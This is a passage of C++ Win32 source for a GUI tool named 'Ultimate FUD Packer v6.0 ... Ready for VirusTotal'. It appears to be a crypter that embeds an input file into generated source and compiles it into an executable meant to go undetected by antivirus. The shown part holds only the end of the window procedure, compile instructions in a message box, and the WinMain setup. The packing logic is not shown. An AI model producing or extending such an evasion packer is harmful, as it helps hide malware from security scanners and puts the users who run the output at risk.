                "2. Run: cl /O2 /MT source.cpp /Fe:output.exe /link user32.lib\n"
                "3. Or use: gcc -O2 -mwindows source.cpp -o output.exe -luser32\n\n"
                "The source includes your embedded input file.",
                "Source Generated", MB_OK | MB_ICONINFORMATION);
            SendMessage(hProgressBar, PBM_SETPOS, 0, 0);
            return 0;
        }
        
        case WM_CLOSE:
        case WM_DESTROY:
            if (hFont) DeleteObject(hFont);
            PostQuitMessage(0);
            return 0;
    }
    
    return DefWindowProcA(hwnd, uMsg, wParam, lParam);
}

// Main entry point
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Force ANSI codepage
    SetConsoleCP(1252);
    SetConsoleOutputCP(1252);
    
    const char* className = "UltimateFUDPacker";
    
    WNDCLASSA wc = {0};
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = className;
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    wc.hIcon = LoadIcon(NULL, IDI_APPLICATION);
    
    if (!RegisterClassA(&wc)) {
        MessageBoxA(NULL, "Failed to register window class", "Error", MB_OK | MB_ICONERROR);
        return 1;
    }
    
    hMainWindow = CreateWindowExA(
        0,
        className,
        "Ultimate FUD Packer v6.0 - File Embedding System - Ready for VirusTotal",
        WS_OVERLAPPEDWINDOW,
        CW_USEDEFAULT, CW_USEDEFAULT, 680, 400,
        NULL, NULL, hInstance, NULL
    );
    
    if (!hMainWindow) {
        MessageBoxA(NULL, "Failed to create main window", "Error", MB_OK | MB_ICONERROR);
        return 1;
    }
    
    ShowWindow(hMainWindow, nCmdShow);
    UpdateWindow(hMainWindow);
    
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    return (int)msg.wParam;
}